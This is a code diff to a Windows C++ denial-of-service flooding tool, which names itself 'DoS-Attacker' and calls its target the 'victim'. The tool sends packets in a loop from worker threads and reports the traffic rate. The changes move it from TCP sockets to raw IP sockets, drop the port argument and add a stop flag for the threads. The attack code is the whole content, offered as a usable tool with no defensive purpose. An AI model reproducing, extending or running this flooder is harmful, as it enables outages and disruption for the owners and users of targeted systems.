@@ -28,13 +28,14 @@ struct DoSInfo
 
 static size_t data = 0, pings = 0;
 static UINT exit_code = -1;
+static bool run = true;
 
 DWORD WINAPI DoSThread(LPVOID lParam)
 {
 	const DoSInfo* info = (DoSInfo*)lParam;
 	DWORD res;
 	long long sent;
-	while (1)
+	while (run)
 	{
 		data += sent = send(*(info->sock), (char*)(info->pkg), info->pkg_size, 0);
 		pings++;
@@ -118,7 +119,7 @@ DWORD WINAPI SpeedThread(LPVOID lParam)
 {
 	time_t t = time(0);
 	HANDLE outh = GetStdHandle(STD_OUTPUT_HANDLE);
-	while (1)
+	while (run)
 	{
 		while (t == time(0));
 		cls(outh);
@@ -138,20 +139,20 @@ int main(int argc,char**argv)
 	SOCKET sock = INVALID_SOCKET;
 	addrinfo victim = { 0 }, * result = NULL;
 	victim.ai_family = AF_UNSPEC;
-	victim.ai_socktype = SOCK_STREAM;
-	victim.ai_protocol = IPPROTO_TCP;
+	victim.ai_socktype = SOCK_RAW;
+	victim.ai_protocol = IPPROTO_RAW;
 	WSADATA wsa;
 	DWORD delay = 0;
 	size_t pkg_size = 1;
 	HANDLE threads[2];
 
-	if (argc != 5)
+	if (argc != 4)
 	{
 		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
 		return 0;
 	}
 
-	pkg_size = _atoi64(argv[3]);
+	pkg_size = _atoi64(argv[2]);
 	if (pkg_size <= 0 || pkg_size > SO_MAX_MSG_SIZE)
 	{
 		printf("Invalid package size.\nPackage size should be less than %u", SO_MAX_MSG_SIZE);
@@ -169,14 +170,14 @@ int main(int argc,char**argv)
 		buff[l] = 'h';
 	}
 
-	delay = atoi(argv[4]);
+	delay = atoi(argv[3]);
 
-	printf("You have chose to attack \'%s:%s\' with a package size of %llu and a delay of %llu.\nContinue? ", argv[1], argv[2], (unsigned long long)pkg_size, (unsigned long long)delay);
+	printf("You have chose to attack \'%s\' with a package size of %llu and a delay of %llu.\nContinue? ", argv[1], (unsigned long long)pkg_size, (unsigned long long)delay);
 	if (getchar() != 'y')return -1;
 
 	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
 
-	INT res = getaddrinfo(argv[1], argv[2], &victim, &result);
+	INT res = getaddrinfo(argv[1], NULL, &victim, &result);
 	if (res)
 	{
 		printf("Error %u in getting address info.\n", res);
@@ -224,9 +225,11 @@ int main(int argc,char**argv)
 	}
 
 	//close all the threads
+	run = false;
+	//close the handles
 	CloseHandle(threads[0]);
 	CloseHandle(threads[1]);
-
+	//clean up
 	closesocket(sock);
 	WSACleanup();
 
